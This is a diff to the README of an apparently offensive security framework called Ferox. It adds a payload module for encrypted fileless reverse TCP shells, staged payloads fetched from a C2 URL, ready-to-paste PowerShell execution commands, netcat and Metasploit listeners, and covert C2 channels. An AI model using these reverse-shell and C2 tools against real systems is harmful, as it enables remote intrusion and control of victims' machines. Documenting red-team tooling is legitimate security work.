@@ -43,6 +43,14 @@ cargo build --release --features memory-forensics
 - DNS C2
 - Relay manager
 
+### 🎯 Smart Payload System (Phase 4)
+- **Fileless Reverse TCP** with AES-256-GCM encryption
+- **Multi-stage payloads** (Stage-1 stager + Stage-2 payload)
+- **Cross-platform support**: Windows, Linux, macOS, Universal
+- **Execution Command Generators**: Ready-to-paste commands per OS
+- **Listener Command Helpers**: Netcat, Socat, Metasploit, Python
+- **C2 Integration**: Teams, GitHub Gist, DNS-over-HTTPS, HTTP Beacon
+
 ### 🔧 Security Operations
 - Reconnaissance (ASN, DNS, WHOIS)
 - High-speed scanning
@@ -87,6 +95,31 @@ ferox c2 setup teams_tunnel --team-id "security-team"
 ferox c2 test http_beacon --target http://target.com
 ```
 
+### Smart Payload Generation
+```bash
+# Interactive payload generation
+ferox> use payloads/rev_tcp_fileless
+ferox (payloads/rev_tcp_fileless)> set LHOST 192.168.1.100
+ferox (payloads/rev_tcp_fileless)> set LPORT 4444
+ferox (payloads/rev_tcp_fileless)> set TARGET_OS windows
+ferox (payloads/rev_tcp_fileless)> run
+
+# Output includes:
+# - Encrypted payload (Base64/Hex)
+# - Ready-to-paste execution commands:
+#   - PowerShell Base64 Decode & Execute
+#   - PowerShell Encoded Command
+#   - CMD via PowerShell
+# - Listener commands:
+#   - nc -lvnp 4444
+#   - msfconsole multi/handler
+
+# Staged payload with C2
+ferox (payloads/rev_tcp_fileless)> set STAGED true
+ferox (payloads/rev_tcp_fileless)> set C2_URL https://c2.example.com/stage2
+ferox (payloads/rev_tcp_fileless)> run
+```
+
 ## 🎨 Interface — Mixed Predator Theme
 - Dark, high-contrast security palette
 - Minimal animations (calm UI)
@@ -103,13 +136,15 @@ SAFE_MODE=1 ferox console
 ```text
 Ferox CLI Integration Layer
        ↓
-[doctor, memory, c2, sessions, console]
+[doctor, memory, c2, sessions, console, payloads]
        ↓
 Module Registry & Session Manager
        ↓
 Security Engine (Async Rust)
        ↓
-[Scanner, Recon, Exploit, Memory, C2, Post, Auxiliary]
+[Scanner, Recon, Exploit, Payloads, Memory, C2, Post, Auxiliary]
+       ↓
+Smart Payload Engine (AES-256-GCM, HKDF, Multi-Stage)
 ```
 
 ## 📦 Module Categories
@@ -118,6 +153,7 @@ Security Engine (Async Rust)
 | Scanner | 8 | Port & service detection |
 | Recon | 6 | Information gathering |
 | Exploit | 4 | Authorized exploitation |
+| **Payloads** | 3 | Smart payload generation with encryption |
 | Memory Forensics | 8 | Volatility3 workflows |
 | Post-Exploitation | 7 | Credentials, persistence |
 | C2 & Evasion | 12 | Communication & stealth |
@@ -172,11 +208,12 @@ ferox doctor check --format markdown
 - docs/maintenance.md — Ferox Doctor
 
 ## 🛣️ Roadmap
-- v2.0.0 – Memory forensics engine
-- Signed plugin marketplace
-- Expanded payload library
-- Web operator dashboard
-- Hardware-backed credential vault
+- [x] v2.0.0 – Memory forensics engine
+- [x] **Phase 4** – Smart Payload System with execution command generators
+- [ ] Signed plugin marketplace
+- [ ] Web operator dashboard
+- [ ] Hardware-backed credential vault
+- [ ] Extended evasion techniques
 
 ## 🤝 Contributing
 1. Fork and branch:
